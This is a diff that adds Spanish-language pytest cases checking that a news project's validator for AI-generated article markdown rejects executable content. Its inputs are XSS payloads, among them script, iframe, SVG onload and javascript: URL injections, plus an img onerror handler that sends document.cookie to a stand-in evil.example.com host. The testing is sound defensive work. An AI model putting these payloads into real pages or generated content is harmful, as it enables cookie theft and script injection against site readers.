@@ -8,6 +8,16 @@ from news_collector.components.editorial.ai_editor import (
     validate_generated_article_markdown,
 )
 
+ART_BODY_MIN_LENGTH = """
+## Introducción
+
+Este es un artículo de prueba con texto suficiente para pasar el umbral mínimo de palabras que exige el validador de artículos generados antes de la publicación en el frontend Astro del proyecto Noticiencias.
+
+El artículo describe un hallazgo científico reciente que fue verificado por al menos dos laboratorios independientes, con resultados consistentes y un margen de error bien documentado en la publicación revisada por pares que apareció en Nature la semana pasada.
+
+Los investigadores confirmaron que este descubrimiento cambia nuestra comprensión fundamental del mecanismo subyacente a este fenómeno natural, abriendo nuevas líneas de investigación para la próxima década.
+"""
+
 
 def test_validate_generated_article_markdown_rejects_placeholder_stub() -> None:
     with pytest.raises(GeneratedArticleValidationError) as excinfo:
@@ -83,3 +93,142 @@ El equipo repitió el experimento con instrumentos mejor calibrados, comparó re
 
 El hallazgo encaja con trabajos recientes que pedían revisar supuestos anteriores y ayuda a entender por qué estudios previos parecían contradictorios aunque partían de datos compatibles entre sí.
 """)
+
+
+# ---------------------------------------------------------------------------
+# Executable-content guardrail tests (Plan 022)
+# ---------------------------------------------------------------------------
+
+
+def test_rejects_script_tag() -> None:
+    with pytest.raises(GeneratedArticleValidationError) as excinfo:
+        validate_generated_article_markdown(f"""
+## Título legítimo
+
+{ART_BODY_MIN_LENGTH}
+
+<script>alert('xss')</script>
+""")
+    assert excinfo.value.error_code == "editorial_executable_content_blocked"
+
+
+def test_rejects_iframe_tag() -> None:
+    with pytest.raises(GeneratedArticleValidationError) as excinfo:
+        validate_generated_article_markdown(f"""
+## Contexto
+
+{ART_BODY_MIN_LENGTH}
+
+<iframe src="https://evil.example.com"></iframe>
+""")
+    assert excinfo.value.error_code == "editorial_executable_content_blocked"
+
+
+def test_rejects_event_handler() -> None:
+    with pytest.raises(GeneratedArticleValidationError) as excinfo:
+        validate_generated_article_markdown(f"""
+## Título
+
+{ART_BODY_MIN_LENGTH}
+
+<img src="foto.jpg" onerror="fetch('https://evil.example.com/steal?'+document.cookie)">
+""")
+    assert excinfo.value.error_code == "editorial_executable_content_blocked"
+
+
+def test_rejects_javascript_url() -> None:
+    with pytest.raises(GeneratedArticleValidationError) as excinfo:
+        validate_generated_article_markdown(f"""
+## Título
+
+{ART_BODY_MIN_LENGTH}
+
+[Click aquí](javascript:alert(1))
+""")
+    assert excinfo.value.error_code == "editorial_executable_content_blocked"
+
+
+def test_rejects_object_tag() -> None:
+    with pytest.raises(GeneratedArticleValidationError) as excinfo:
+        validate_generated_article_markdown(f"""
+## Resumen
+
+{ART_BODY_MIN_LENGTH}
+
+<object data="evil.swf"></object>
+""")
+    assert excinfo.value.error_code == "editorial_executable_content_blocked"
+
+
+def test_rejects_embed_tag() -> None:
+    with pytest.raises(GeneratedArticleValidationError) as excinfo:
+        validate_generated_article_markdown(f"""
+## Análisis
+
+{ART_BODY_MIN_LENGTH}
+
+<embed src="evil.pdf">
+""")
+    assert excinfo.value.error_code == "editorial_executable_content_blocked"
+
+
+def test_accepts_code_example_in_fence() -> None:
+    """A script tag inside a code fence is a legitimate code example."""
+    validate_generated_article_markdown(f"""
+## Investigación
+
+{ART_BODY_MIN_LENGTH}
+
+```html
+<script src="analytics.js"></script>
+```
+""")
+
+
+def test_rejects_svg_with_event_handler() -> None:
+    with pytest.raises(GeneratedArticleValidationError) as excinfo:
+        validate_generated_article_markdown(f"""
+## Visualización
+
+{ART_BODY_MIN_LENGTH}
+
+<svg onload="alert(1)"><circle r="10"/></svg>
+""")
+    assert excinfo.value.error_code == "editorial_executable_content_blocked"
+
+
+def test_rejects_onclick_attribute() -> None:
+    with pytest.raises(GeneratedArticleValidationError) as excinfo:
+        validate_generated_article_markdown(f"""
+## Hallazgos
+
+{ART_BODY_MIN_LENGTH}
+
+<div onclick="steal()">contenido</div>
+""")
+    assert excinfo.value.error_code == "editorial_executable_content_blocked"
+
+
+def test_accepts_html_without_executable_content() -> None:
+    """Plain HTML tags like <b>, <em>, <a href='https://...'> are safe."""
+    validate_generated_article_markdown(f"""
+## Contexto
+
+{ART_BODY_MIN_LENGTH}
+
+Los investigadores usaron <strong>microscopía de alta resolución</strong> para observar
+la estructura de las proteínas. <a href="https://doi.org/10.1234/example">El artículo
+original</a> fue publicado en una revista revisada por pares.
+""")
+
+
+def test_rejects_whitespace_variant_script_tag() -> None:
+    with pytest.raises(GeneratedArticleValidationError) as excinfo:
+        validate_generated_article_markdown(f"""
+## Análisis
+
+{ART_BODY_MIN_LENGTH}
+
+<  script  >alert('xss')<  /script  >
+""")
+    assert excinfo.value.error_code == "editorial_executable_content_blocked"
